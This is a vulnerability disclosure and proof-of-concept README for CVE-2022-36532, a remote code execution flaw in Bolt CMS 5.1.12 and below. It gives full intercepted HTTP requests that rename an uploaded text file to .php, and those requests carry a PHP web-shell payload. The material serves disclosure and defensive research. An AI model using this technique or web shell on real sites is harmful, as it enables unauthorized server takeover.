# Proof of Concept for CVE-2022-36532

A vulnerability in Bolt CMS version 5.1.12 and below allows an authenticated user with the `EDITOR_ROLE` to achieve remote code execution. This vulnerability can be detected using this script, for details on the vulnerability see <https://lutrasecurity.com/en/articles/cve-2022-36532/>.

## Usage

Three parameters are needed to run the script: The username, the corresponding password and the Bolt CMS instance URL.
To test an instance at `http://127.0.0.1:8000/` with the credentials `jsmith:password` use the following command:

```
./CVE-2022-36532.py jsmith password "http://127.0.0.1:8000/"
```

## CVE-2022-36532

#### Bolt CMS - Authenticated Remote Code Execution

Bolt is a content management system based on PHP that is a lightweight alternative to Wordpress and is used extensively by agencies. We discovered a vulnerability in version 5.1.12 and below that allows an authenticated user with the `ROLE_EDITOR` privileges to upload and rename a file to achieve remote code execution.

This vulnerability was addressed in the [maintenance release 5.1.13](https://github.com/bolt/core/releases/tag/5.1.13).

## Timeline

* **14.07.2022**: Discovery of the vulnerability and responsible disclosure to the Bolt CMS team.
* **26.08.2022**: Vulnerability addressed by the Bolt CMS team: [Release 5.1.13](https://github.com/bolt/core/releases/tag/5.1.13).
* **05.09.2022**: CVE ID CVE-2022-36532 assigned.
* **05.09.2022**: Publication of this article.
* **12.09.2022**: Publication of the proof of concept.

We would like to thank [@bobdenotter](https://github.com/bobdenotter) for the fast addressing of the vulnerability and overall very pleasent responsible disclosure procedure.

## Remote Code Execution via File Upload

In order to exploit the vulnerability and achieve remote code execution, a user account with the `ROLE_EDITOR` privileges is needed:

![Screenshot of Bolt CMS displaying a user with the editor privileges.](./img/jsmith-user.png)

#### Example user with the editor privileges.

Files can be uploaded within the CMS at <http://127.0.0.1:8000/bolt/filemanager/files>. However, only certain file extensions like `.png`, `.svg`, `.txt`, etc. are allowed.

![Screenshot of Bolt CMS displaying the upload functionality.](./img/file-upload.png)

#### File upload functionality of Bolt.

For example, we can upload a `.txt` file containing PHP code (`<?php $RESULT=7*7; echo $RESULT; ?>`) to the `files/` directory on the server and access it at <http://127.0.0.1:8000/files/poc.txt>:

![Screenshot of Bolt CMS displaying the uploaded .txt file with our payload.](./img/uploaded-file-poc.txt.png)

#### Uploaded .txt file with our payload.

Since it is a `.txt` file, the PHP code inside it doesn’t get executed by the server.
Inside the CMS there is no renaming option, however when editing a file, the HTTP request can be intercepted and manipulated to rename a file. This can be abused to achieve command execution:

1. The uploaded file `poc.txt` can be edited within Bolt at: <http://127.0.0.1:8000/bolt/file-edit/files?file=/poc.txt>. Since we do not want to change it, we can just click “Save” and intercept the HTTP request from our browser:

```
POST /bolt/file-edit/files?file=/poc.txt HTTP/1.1
Host: 127.0.0.1:8000
Content-Length: 243
...
Cookie: PHPSESSID=brgvh475o4ad65626vcs9ogjak
Connection: close
file=%2Fpoc.txt&location=files&_csrf_token=6f0a099f0e644f9dc.MPpzSbmHem8MICUL6JA_9JIONsNBGEp_15vNFZLnJuU.b78fJc6yTThPUE9T3tULjf1vUbY1TB8yns6eIf-PX69ZiTsNw8wyLHxJaA&editfile=%3C%3Fphp+echo+system%28%24_GET%5B%22cmd%22%5D%29+%3F%3E%0D%0A&save=

```

2. By modifying the query parameter `file` from `/poc.txt` to `/poc.php`, the file gets renamed.

```
POST /bolt/file-edit/files?file=/poc.php HTTP/1.1
Host: 127.0.0.1:8000
Content-Length: 243
...
Cookie: PHPSESSID=brgvh475o4ad65626vcs9ogjak
Connection: close
file=%2Fpoc.txt&location=files&_csrf_token=6f0a099f0e644f9dc.MPpzSbmHem8MICUL6JA_9JIONsNBGEp_15vNFZLnJuU.b78fJc6yTThPUE9T3tULjf1vUbY1TB8yns6eIf-PX69ZiTsNw8wyLHxJaA&editfile=%3C%3Fphp+echo+system%28%24_GET%5B%22cmd%22%5D%29+%3F%3E%0D%0A&save=

```

3. After renaming the file, the PHP code inside the uploaded file is executed when the file is accessed by browsing to <http://127.0.0.1:8000/files/poc.php>:

![Screenshot of Bolt CMS displaying the command output of the 7*7 PHP command](./img/PHP-executed.png)

#### Output of the 7\*7 PHP command.

We will make a proof of concept script available in our GitHub account at [lutrasecurity/CVE-2022-36532](https://github.com/lutrasecurity/CVE-2022-36532) on the 12.09.2022 to be able to reproduce the vulnerability.
